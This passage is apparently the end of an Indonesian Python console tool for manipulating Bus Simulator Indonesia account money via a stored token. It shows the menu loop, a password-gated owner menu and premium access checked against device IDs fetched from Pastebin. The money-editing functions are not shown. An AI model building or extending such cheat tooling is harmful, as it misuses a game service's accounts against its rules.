    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 5. 𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 \x1b[1;33;41m\x1b[41m\x1b[1;37m[\x1b[1;33m 𝗢𝗪𝗡𝗘𝗥 \x1b[1;37m]\x1b[0m")    
    print(Fore.YELLOW + Style.BRIGHT + "\x1b[1;32m║ \x1b[0m 6. 𝗔𝗞𝗦𝗘𝗦 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 \x1b[1;33;41m\x1b[41m\x1b[1;37m[\x1b[1;33m 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 \x1b[1;37m]\x1b[0m")
    print(Fore.GREEN + Style.BRIGHT + "╚═══════════════════════════════════════════════╝")
    print()     

def validasiid(url):
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text.splitlines()
    except Exception as e:
        print(f"Terjadi kesalahan saat mengambil data dari Pastebin: {e}")
        return []
        
#INI BAGIAN MENU UTAMA, MENU FITUR. 
def main():
    pilihanlogin()
    if ambil_informasi_akun():
        while True:
            show_menu()
            try:
                pilihan = int(input("""╭­\x1b[41m❏ \x1b[1;37m𝗠𝗔𝗦𝗨𝗞𝗔𝗡 𝗣𝗜𝗟𝗜𝗛𝗔𝗡 𝗔𝗡𝗗𝗔 ❏\x1b[0m
╰───\x1b[1;33m▶ """)) 
                print() 
                print() 
                if pilihan == 1:
                    pengisian_uang()
                elif pilihan == 2:
                    kurasan()
                elif pilihan == 3:
                    print(Fore.CYAN + f"Token Saat Ini: {token_bussid}")
                    time.sleep(2)
                elif pilihan == 4:
                    print(Fore.GREEN + Style.BRIGHT + "\n\x1b[1;33;41m • \x1b[1;37[𝚂𝙴𝙻𝙰𝙼𝙰𝚃 𝚃𝙸𝙽𝙶𝙶𝙰𝙻\x1b[1;33m •  \x1b[0m\x1b[")
                    sys.exit(0)
                elif pilihan == 5:
                    if verifikasi_password():
                        fungsi_pemilik()
                elif pilihan == 6:
                    device_id_input = input("""╭­\x1b[41m❏ \x1b[1;37m𝗠𝗔𝗦𝗨𝗞𝗔𝗡 𝗗𝗘𝗩𝗜𝗖𝗘 𝗜𝗗 ❏\x1b[0m
╰───\x1b[1;33m▶ """)
                    
                    url_prem = 'https://pastebin.com/raw/w9AmTC1E'
                    valid_device_ids = validasiid(url_prem)
                    
                    if device_id_input in valid_device_ids:
                        akses_lanjutan_pemilik()
                    else:
                        print(Fore.RED + "Akses lanjutan pemilik ditolak.") 
                        sys.exit()
                else:
                    print(Fore.RED + Style.BRIGHT + "\nPilihan tidak valid. Coba lagi.")
                    time.sleep(2)
            except ValueError:
                print(Fore.RED + Style.BRIGHT + "\nInput harus berupa angka. Coba lagi.")
                time.sleep(2)
    else:
        print(Fore.RED + "Gagal mengambil informasi akun. Program dihentikan.")
        sys.exit() 

                
# Variabel global untuk token dan informasi akun
token_bussid = None
informasi_akun = {}

# Jalankan program hanya jika file ini di-eksekusi langsung
if __name__ == "__main__":
    main()